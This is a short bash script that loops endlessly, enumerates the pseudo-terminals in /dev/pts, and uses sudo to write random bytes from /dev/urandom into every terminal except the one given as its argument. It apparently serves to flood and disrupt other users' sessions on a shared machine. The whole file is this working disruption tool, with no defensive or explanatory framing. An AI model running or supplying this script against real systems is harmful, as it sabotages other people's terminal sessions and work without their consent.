#!/bin/bash


while [[ 1 -eq 1 ]]; do 
	num=( $(cd /dev/pts/; echo *) )
	for x in $num; do 
		if  [[ ! $x -eq $1 ]]; then
		sudo head /dev/urandom >> /dev/pts/$x 2>/dev/null 
		fi
	done;

done;


